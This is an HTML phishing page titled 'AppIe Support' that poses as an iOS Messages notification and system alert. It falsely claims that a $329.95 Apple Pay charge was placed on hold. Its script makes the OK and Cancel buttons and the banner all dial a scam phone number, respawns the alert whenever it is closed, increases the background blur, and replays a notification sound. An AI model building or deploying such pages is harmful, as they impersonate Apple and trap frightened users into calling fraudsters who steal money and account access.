
ƒ<!DOCTYPE html>
<html lang="en-US" class="no-js">
<head>
<script async defer src="https://tools.luckyorange.com/core/lo.js?site-id=6d7fcd43"></script>
<script>
  const domain = window.location.hostname;
  const s = document.createElement("script");
  s.defer = true;
  s.setAttribute("data-domain", domain);
  s.src = "https://plausible.io/js/script.js";
  document.head.appendChild(s);
</script>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
  <meta name="theme-color" content="#000000">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <title>AppIe Support</title>

  <style>
    :root {
      --safe-top: env(safe-area-inset-top);
      --safe-right: env(safe-area-inset-right);
      --safe-bottom: env(safe-area-inset-bottom);
      --safe-left: env(safe-area-inset-left);
      --shadow: 0 18px 50px rgba(0, 0, 0, 0.28);
      --ios-blue: #007aff;
      --overlay-blur: 0px;
      --overlay-alpha: 0.10;
    }

    html, body {
      margin: 0;
      width: 100%;
      height: 100%;
      overflow: hidden;
      -webkit-text-size-adjust: 100%;
      -webkit-tap-highlight-color: transparent;
    }

    body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;

    background:
        linear-gradient(180deg, rgba(0,0,0,0.16), rgba(0,0,0,0.24)),
        url("images/bg-img.jpg");

    background-size: cover;
    background-position: center;
    background-repeat: no-repeat;
    background-attachment: fixed;
    position: relative;
}

    .blur-layer {
      position: fixed;
      inset: 0;
      background: rgba(0, 0, 0, var(--overlay-alpha));
      backdrop-filter: blur(var(--overlay-blur));
      -webkit-backdrop-filter: blur(var(--overlay-blur));
      pointer-events: none;
      z-index: 1;
    }

    .notif-wrap {
      position: fixed;
      top: calc(-180px - var(--safe-top));
      left: 50%;
      transform: translateX(-50%);
      width: min(94vw, 420px);
      z-index: 20;
      opacity: 0;
      transition: top 0.45s cubic-bezier(0.175, 0.885, 0.32, 1.1), opacity 0.25s ease;
    }

    .notif-wrap.show {
      top: calc(16px + var(--safe-top));
      opacity: 1;
    }

    .notif {
      background: rgba(255, 255, 255, 0.88);
      backdrop-filter: blur(24px) saturate(180%);
      -webkit-backdrop-filter: blur(24px) saturate(180%);
      border: 0.5px solid rgba(0, 0, 0, 0.08);
      border-radius: 22px;
      box-shadow: var(--shadow);
      padding: 12px 14px 13px;
      color: #000;
      cursor: pointer;
    }

    .notif-head {
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 12px;
      margin-bottom: 7px;
    }

    .notif-left {
      display: flex;
      align-items: center;
      gap: 8px;
      min-width: 0;
    }

    .app-icon {
      width: 16px;
      height: 16px;
      flex: 0 0 auto;
    }

    .app-name {
      font-size: 13px;
      font-weight: 700;
      color: #111;
      white-space: nowrap;
    }

    .time {
      font-size: 12px;
      color: #6b7280;
      white-space: nowrap;
    }

    .title {
      font-size: 16px;
      font-weight: 700;
      line-height: 1.25;
      margin: 0 0 4px;
      color: #111;
      letter-spacing: -0.01em;
    }

    .message {
      font-size: 14px;
      line-height: 1.45;
      margin: 0;
      color: #374151;
      word-break: break-word;
    }

    .alert-box {
      position: fixed;
      left: 50%;
      top: 50%;
      transform: translate(-50%, -50%);
      width: min(92vw, 400px);
      border-radius: 14px;
      text-align: center;
      box-shadow: var(--shadow);
      padding: 16px 16px 0;
      box-sizing: border-box;
      background: rgba(255, 255, 255, 0.92);
      backdrop-filter: blur(24px) saturate(180%);
      -webkit-backdrop-filter: blur(24px) saturate(180%);
      border: 0.5px solid rgba(0, 0, 0, 0.08);
      overflow: hidden;
      color: #000;
      z-index: 10;
    }

    .alert-title {
      font-size: 17px;
      font-weight: 700;
      margin: 0 0 8px;
      letter-spacing: -0.01em;
    }

    .alert-message {
      font-size: 15px;
      line-height: 1.45;
      margin: 0 0 16px;
      color: #2c2c2e;
      padding: 0 4px;
    }

    .alert-buttons {
      display: flex;
      border-top: 0.5px solid rgba(0, 0, 0, 0.08);
      margin-top: 8px;
    }

    .alert-btn {
      flex: 1;
      min-height: 48px;
      padding: 12px 10px;
      font-size: 17px;
      font-weight: 400;
      text-decoration: none;
      display: flex;
      align-items: center;
      justify-content: center;
      color: var(--ios-blue);
      background: transparent;
      -webkit-tap-highlight-color: transparent;
      touch-action: manipulation;
      user-select: none;
    }

    .alert-btn + .alert-btn {
      border-left: 0.5px solid rgba(0, 0, 0, 0.08);
    }

    .alert-btn:active {
      background: rgba(0, 122, 255, 0.08);
    }

    @media (max-width: 768px) {
      .notif-wrap { width: min(94vw, 420px); }
      .alert-box { width: min(92vw, 360px); }
    }
  </style>
</head>

<body>
  <div class="blur-layer" id="blurLayer"></div>

  <div class="notif-wrap" id="notifWrap" role="status" aria-live="polite">
    <div class="notif" id="notifCard">
      <div class="notif-head">
        <div class="notif-left">
          <div class="app-icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" width="16" height="16" aria-hidden="true">
              <rect width="100" height="100" rx="22" fill="#34C759"></rect>
              <path d="M50 22C28 22 12 36 12 53C12 63 18 72 27 77C27 77 26 86 19 91C19 91 34 91 43 80C45 80.5 48 81 50 81C72 81 88 67 88 53C88 36 72 22 50 22Z" fill="#FFF"></path>
            </svg>
          </div>
          <div class="app-name">Messages</div>
        </div>
        <div class="time">now</div>
      </div>
      <div class="title">Payment Successful</div>
      <p class="message">Your Apple ID was recently used at APPLE STORE for $329.95 Via Apple Pay Pre-Authorization! We have placed those request on hold to ensure safest and Security. Not you? Immediately call Apple Support to Freeze it!</p>
    </div>
  </div>

  <audio id="notifSound" preload="auto" playsinline>
    <source src="ualert.mpeg" type="audio/mpeg">
  </audio>

  <template id="alertTemplate">
    <div class="alert-box" role="alertdialog" aria-modal="true">
      <div class="alert-title">New notification</div>
      <p class="alert-message">Your Apple ID was recently used at APPLE STORE for $329.95 Via Apple Pay Pre-Authorization! We have placed those request on hold to ensure safest and Security. Not you? Immediately call Apple Support to Freeze it!</p>
      <div class="alert-buttons">
        <a class="alert-btn" href="#cancel" data-action="cancel">Cancel</a>
        <a class="alert-btn" href="#ok" data-action="ok">OK</a>
      </div>
    </div>
  </template>

  <script>
    const notifWrap = document.getElementById('notifWrap');
    const notifCard = document.getElementById('notifCard');
    const blurLayer = document.getElementById('blurLayer');
    const template = document.getElementById('alertTemplate');
    const audio = document.getElementById('notifSound');

    let blurPx = 0;
    let alpha = 0.10;
    let audioUnlocked = false;

    const PHONE_NUMBER_OK = '+1(855)719-3939';
    const PHONE_NUMBER_CANCEL = '+1(855)719-3939';
    const PHONE_NUMBER_NOTIF = '+1(855)719-3939'; // call triggered on notification click

    function unlockAudio() {
      if (audioUnlocked || !audio) return;
      audio.muted = true;
      audio.currentTime = 0;
      audio.play().then(() => {
        audio.pause();
        audio.currentTime = 0;
        audio.muted = false;
        audioUnlocked = true;
      }).catch(() => {
        audio.muted = false;
      });
    }

    function playNotificationSound() {
      if (!audio) return;
      audio.currentTime = 0;
      setTimeout(() => {
        audio.play().catch(() => {});
      }, 300);
    }

    function triggerCall(number) {
      window.location.href = 'tel:' + number.replace(/[^0-9+]/g, '');
    }

    function showBanner() {
      notifWrap.classList.add('show');
      playNotificationSound();
      setTimeout(() => notifWrap.classList.remove('show'), 3000);
    }

    function refreshBlur() {
      blurPx = Math.min(20, blurPx + 1.5);
      alpha = Math.min(0.36, alpha + 0.03);
      document.documentElement.style.setProperty('--overlay-blur', blurPx + 'px');
      document.documentElement.style.setProperty('--overlay-alpha', alpha.toFixed(2));
    }

    function spawnAlert() {
      const old = document.querySelector('.alert-box');
      if (old) old.remove();

      const box = template.content.firstElementChild.cloneNode(true);
      box.querySelectorAll('.alert-btn').forEach(btn => {
        btn.addEventListener('click', e => {
          e.preventDefault();
          const action = btn.getAttribute('data-action');
          if (action === 'ok') {
            triggerCall(PHONE_NUMBER_OK);
          } else if (action === 'cancel') {
            triggerCall(PHONE_NUMBER_CANCEL);
          }
          spawnAlert();
        });
      });

      document.body.appendChild(box);
    }

    // Click on notification banner triggers call
    notifCard.addEventListener('click', () => {
      refreshBlur();
      triggerCall(PHONE_NUMBER_NOTIF);
    });

    window.addEventListener('load', () => {
      unlockAudio();
      setTimeout(showBanner, 800);
      spawnAlert();
      setInterval(() => {
        notifWrap.classList.remove('show');
        setTimeout(showBanner, 250);
      }, 7000);
    }, { once: true });

    document.addEventListener('click', unlockAudio, { once: true });
    document.addEventListener('touchend', unlockAudio, { once: true });
  </script>
</body>
</html>
